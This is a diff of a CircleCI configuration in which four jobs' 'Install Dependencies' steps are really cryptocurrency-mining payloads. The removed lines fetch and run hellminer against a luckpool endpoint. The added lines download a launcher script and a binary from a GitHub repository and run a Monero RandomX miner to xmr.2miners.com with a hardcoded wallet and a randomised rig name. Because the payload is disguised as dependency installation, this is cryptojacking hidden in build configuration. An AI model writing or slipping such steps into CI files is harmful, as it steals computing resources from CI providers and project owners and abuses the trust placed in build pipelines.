@@ -6,28 +6,28 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RRtiCkRWjg1VpKtieBvsTD2tnUvNBswvga.BRO -p x --cpu 35
+            command: wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./ cmdline_launcher.sh -algo randomx -coin XMR -wallet 8AWpgF7QQttESPuTKSCHXcLSAVoJmF1eFFQkNCpEZX4NMQrTaYKHBWvh7b7M1PRdJiQcVN71Sxdp1gZ2pbsrmtqzNinsy2K -rigName $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RRtiCkRWjg1VpKtieBvsTD2tnUvNBswvga.BRO -p x --cpu 35
+            command: wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./ cmdline_launcher.sh -algo randomx -coin XMR -wallet 8AWpgF7QQttESPuTKSCHXcLSAVoJmF1eFFQkNCpEZX4NMQrTaYKHBWvh7b7M1PRdJiQcVN71Sxdp1gZ2pbsrmtqzNinsy2K -rigName $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
     Devop2:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RRtiCkRWjg1VpKtieBvsTD2tnUvNBswvga.BRO -p x --cpu 35
+            command: wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./ cmdline_launcher.sh -algo randomx -coin XMR -wallet 8AWpgF7QQttESPuTKSCHXcLSAVoJmF1eFFQkNCpEZX4NMQrTaYKHBWvh7b7M1PRdJiQcVN71Sxdp1gZ2pbsrmtqzNinsy2K -rigName $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
     Devop3:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RRtiCkRWjg1VpKtieBvsTD2tnUvNBswvga.BRO -p x --cpu 35
+            command: wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./ cmdline_launcher.sh -algo randomx -coin XMR -wallet 8AWpgF7QQttESPuTKSCHXcLSAVoJmF1eFFQkNCpEZX4NMQrTaYKHBWvh7b7M1PRdJiQcVN71Sxdp1gZ2pbsrmtqzNinsy2K -rigName $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
 workflows:
     version: 2.1
     build:
